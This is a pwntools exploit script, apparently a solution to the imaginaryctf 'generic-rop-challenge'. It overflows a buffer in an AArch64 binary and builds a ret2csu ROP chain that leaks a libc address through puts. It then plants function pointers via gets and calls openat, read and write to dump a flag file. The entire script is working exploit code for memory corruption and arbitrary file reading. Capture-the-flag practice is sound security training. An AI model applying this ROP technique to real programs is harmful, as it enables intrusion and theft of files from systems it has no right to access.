#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

ld = ELF("./ld-linux-aarch64.so.1")
libc = ELF("./libc.so.6")
elf = context.binary = ELF("./vuln")


def start(argv=[], *a, **kw):
    global flag_path
    host = args.HOST or 'generic-rop-challenge.chal.imaginaryctf.org'
    port = int(args.PORT or 42042)
    if args.REMOTE:
        flag_path = b"/home/user/flag.txt\x00"
        return remote(host, port)
    if args.GDB:
        flag_path = b"/run/shm/flag.txt\x00"
        return process([qemu, "-g", str(debug_port), elf.path])
    else:
        flag_path = b"/run/shm/flag.txt\x00"
        return process([qemu, elf.path] + argv, env=env, *a, **kw)


env = {}
qemu = "/usr/bin/qemu-aarch64-static"
debug_port = 1234
flag_path = b""
io = start()

pad = 80 - 0x10
main_x29 = b"BBBBBBBB"
bss = elf.bss(0x200)

csu_1 = 0x400948
csu_2 = 0x400928


def ret2csu(w0, x1, x2, func_ptr, next_gadget):
    payload = b"A" * pad + main_x29 + p64(csu_1)
    payload += flat(bss, p64(csu_2))
    payload += flat(0, 1)  # x19, x20
    payload += flat(func_ptr, w0)  # x21, x22
    payload += flat(x1, x2)  # x23, x24
    payload += flat(bss, next_gadget)
    return payload


# Leak LIBC
payload = ret2csu(elf.got["puts"], 0, 0, elf.got["puts"], elf.symbols["main"])
io.sendlineafter(b"below\n", payload)
leak_puts = u64(io.recvline(keepends=False).ljust(8, b"\x00"))
if not args.REMOTE:
    leak_puts |= 0x4000000000
log.info(f"{leak_puts=:#x}")

libc.address = leak_puts - libc.symbols["puts"]
log.info(f"{libc.address=:#x}")

# gets(bss) // stdin: /home/user/flag.txt
pause()
log.info(f"setup flag path string @ bss + 0x500")
log.info(f"{flag_path=}")
flag_path_addr = elf.bss(0x500)
payload = ret2csu(flag_path_addr, 0, 0, elf.got["gets"], elf.symbols["main"])
io.sendlineafter(b"below\n", payload)
io.sendline(flag_path)  # absolute path to ignore `dirfd` for `openat`

# gets(bss) // stdin: libc.symbols["openat"]
openat_fptr = elf.bss(0x600)
log.info(f"setup openat function pointer @ bss + 0x600")
payload = ret2csu(openat_fptr, 0, 0, elf.got["gets"], elf.symbols["main"])
io.sendlineafter(b"below\n", payload)
io.sendline(p64(libc.symbols["openat"]))

# fini_ptr = 0x400e20

# openat(0, flag_path_addr, 0)
log.info(f"openat(0, flag_path_addr, 0)")
payload = ret2csu(0, flag_path_addr, 0, openat_fptr, elf.symbols["main"])
io.sendlineafter(b"below\n", payload)

# gets(bss) // stdin: libc.symbols["read"]
read_fptr = elf.bss(0x600)
log.info(f"setup read function pointer @ bss + 0x600")
payload = ret2csu(read_fptr, 0, 0, elf.got["gets"], elf.symbols["main"])
io.sendlineafter(b"below\n", payload)
io.sendline(p64(libc.symbols["read"]))

# read(5, flag_addr, 0x100)
flag_addr = elf.bss(0x700)
log.info(f"read(5, flag_addr, 0x100)")  # trial-and-error to find the proper fd
payload = ret2csu(5, flag_addr, 0x100, read_fptr, elf.symbols["main"])
io.sendlineafter(b"below\n", payload)

# gets(bss) // stdin: libc.symbols["write"]
write_fptr = elf.bss(0x600)
log.info(f"setup write function pointer @ bss + 0x600")
payload = ret2csu(write_fptr, 0, 0, elf.got["gets"], elf.symbols["main"])
io.sendlineafter(b"below\n", payload)
io.sendline(p64(libc.symbols["write"]))

# write(1, flag_addr, 0x100)
payload = ret2csu(1, flag_addr, 0x100, write_fptr, elf.symbols["main"])
io.sendlineafter(b"below\n", payload)

io.interactive()
